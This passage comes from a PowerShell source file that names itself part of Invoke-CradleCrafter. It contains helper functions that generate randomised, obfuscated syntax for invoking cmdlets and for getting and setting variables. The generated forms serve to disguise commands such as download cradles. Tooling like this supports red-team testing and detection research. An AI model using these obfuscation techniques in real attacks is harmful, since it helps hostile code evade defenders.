        default {Write-Error "An invalid `$InvokeLevel value ($InvokeLevel) was passed to switch block for Out-EncapsulatedInvokeExpression."; Exit}
    }

    Return $Result
}


Function Out-PsGetCmdlet
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates random syntax for invoking a cmdlet (denoted by $VarString) via the GetCommand, GetCmdlet, and GetCmdlets methods found in $ExecutionContext.InvokeCommand. GetCommands method is excluded since it was introduced in PS3.0.

Invoke-CradleCrafter Function: Out-PsGetCmdlet
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-PsGetCmdlet generates random syntax for invoking a cmdlet (denoted by $VarString) via the GetCommand, GetCmdlet, and GetCmdlets methods found in $ExecutionContext.InvokeCommand. GetCommands method is excluded since it was introduced in PS3.0.

.PARAMETER VarString

Specifies the name of the cmdlet (or search string with wildcards) to be retrieved.

.EXAMPLE

C:\PS> Out-PsGetCmdlet 'N*ct'

&$ExecutionContext.InvokeCommand.GetCmdlets('N*ct')

C:\PS> Out-PsGetCmdlet '*w-*ct'

.$ExecutionContext.InvokeCommand.GetCmdlet($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|Where-Object{(Item Variable:_).Value.Name-like'G*om*e'}).Name).Invoke('*w-*ct',1,1))

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $VarString
    )

    # Set boolean to see if additional syntax not compatible with wildcards can be used.
    $NoWildcards = $TRUE
    If($VarString.Contains('*'))
    {
        $NoWildcards = $FALSE
    }

    # Generate random boolean True and cmdlet type syntaxes.
    $BooleanTrue  = Get-Random -Input @(1,'$TRUE')
    $BooleanTrue2 = Get-Random -Input @(1,'$TRUE')
    $CmdletType   = Get-Random -Input @('[System.Management.Automation.CommandTypes]::Cmdlet','[Management.Automation.CommandTypes]::Cmdlet')

    # Generate numerous ways to execute the passed in variable via PS 1.0 GetCmdlet (and similar) syntax.
    $GetCmdletSyntaxOptions  = @()
    $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCmdlets('$VarString')"
    $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCmdlet($ExecContextVariable.$InvokeCommand.$GetCommandName('$VarString',$BooleanTrue,$BooleanTrue2))"
    $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCommand($ExecContextVariable.$InvokeCommand.$GetCommandName('$VarString',$BooleanTrue,$BooleanTrue2),$CmdletType)"
    If($NoWildcards)
    {
        $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCmdlet('$VarString')"
        $GetCmdletSyntaxOptions += $InvocationOperator + "$ExecContextVariable.$InvokeCommand.$GetCommand('$VarString',$CmdletType)"
    }
    # Select random option from above.
    $GetCmdletSyntax = Get-Random -Input $GetCmdletSyntaxOptions
    
    Return $GetCmdletSyntax
}


Function Out-GetVariable
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates random syntax for performing Get-Variable functionality for variables and environment variables.

Invoke-CradleCrafter Function: Out-GetVariable
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-GetVariable generates random syntax for performing Get-Variable functionality for variables and environment variables.

.PARAMETER VarName

Specifies the name of the variable (or environment variable).

.EXAMPLE

C:\PS> Out-GetVariable 'varName'

$varName

C:\PS> Out-GetVariable 'varName'

(GV varName -ValueO)

C:\PS> Out-GetVariable 'varName'

(GI Variable:\varName).Value

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $VarName
    )

    # Change $VariableType variable to handle Variable by default but also environment variables if input $VarName starts with 'Env:'.
    $VariableType = Get-Random -Input @('Variable:','Variable:\','Variable:/')
    If($VarName.ToLower().StartsWith('env:'))
    {
        $VariableType = ''
    }

    # Generate random substring of -ValueOnly flag.
    $FullArgument           = "-ValueOnly"
    $ValueOnlyFlagSubString = $FullArgument.SubString(0,(Get-Random -Minimum 3 -Maximum ($FullArgument.Length)))

    # Generate numerous ways to reference the input $VarName variable, including Get-Variable varname, Get-ChildItem Variable:varname, Get-Item Variable:varname, etc.
    $VariableSyntax  = @()
    If(!($VarName.Contains('*')))
    {
        # Do not use standard '$' variable syntax if the input variable name contains wildcards.
        $VariableSyntax += '$' + $VarName.Replace(':\',':').Replace(':/',':')
    }
    $VariableSyntax += '(' + (Get-Random -Input @('DIR','Get-ChildItem','GCI','ChildItem','LS','Get-Item','GI','Item')) + " $VariableType$VarName).Value"
    If(!($VarName.ToLower().StartsWith('env:')))
    {
        # Do not use Get-Variable/GV/Variable syntax if the variable name contains 'env:' meaning it is an environment variable.
        $VariableSyntax += '(' + (Get-Random -Input @('Get-Variable','GV','Variable')) + ' ' + (Get-Random -Input @("$VarName).Value","$VarName $ValueOnlyFlagSubString)"))
    }

    # Select random option from above.
    $Result = Get-Random -Input $VariableSyntax

    Return $Result
}


Function Out-SetVariable
{
<#
.SYNOPSIS

HELPER FUNCTION :: Generates random syntax for performing Set-Variable functionality for variables and environment variables.

Invoke-CradleCrafter Function: Out-SetVariable
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Out-SetVariable generates random syntax for performing Set-Variable functionality for variables and environment variables.

.PARAMETER VarName

Specifies the name of the variable (or environment variable).

.EXAMPLE

C:\PS> Out-SetVariable 'varName'

$varName=

C:\PS> Out-SetVariable 'varName'

Set-Variable varName

C:\PS> Out-SetVariable 'varName'

SI Variable:/varName

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $VarName
    )

    # Change $VariableType variable to handle Variable by default but also environment variables if input $VarName starts with 'Env:'.
    $VariableType = Get-Random -Input @('Variable:','Variable:\','Variable:/')
    If($VarName.ToLower().StartsWith('env:'))
    {
        $VariableType = ''
    }
    
    # Generate random substring of -Value flag.
    $FullArgument              = "-Value"
    $ValueFlagSubString        = $FullArgument.SubString(0,(Get-Random -Minimum 3 -Maximum ($FullArgument.Length)))

    # Generate numerous ways to reference the input $VarName variable, including Set-Variable varname, Set-Item Variable:varname, New-Item Variable:varname, etc.
    $VariableSyntax  = @()
    If(!($VarName.Contains('*'))) {$VariableSyntax += '$' + $VarName + '='}
    $VariableSyntax += (Get-Random -Input @('Set-Variable','SV')) + ' ' + $VarName + ' '
    $VariableSyntax += (Get-Random -Input @('Set-Item','SI')) + ' ' + "$VariableType$VarName" + ' '
    #$VariableSyntax += (Get-Random -Input @('New-Item','NI')) + ' ' + "$VariableType$VarName" + ' ' + $ValueFlagSubString + ' '
    # Commenting New-Item/NI above. Technically it works but in repeat testing in Invoke-CradleCrafter if you don't remove the variable then the command will fail when trying to create an existing variable.

    # Select random option from above.
    $Result = Get-Random -Input $VariableSyntax

    Return $Result
}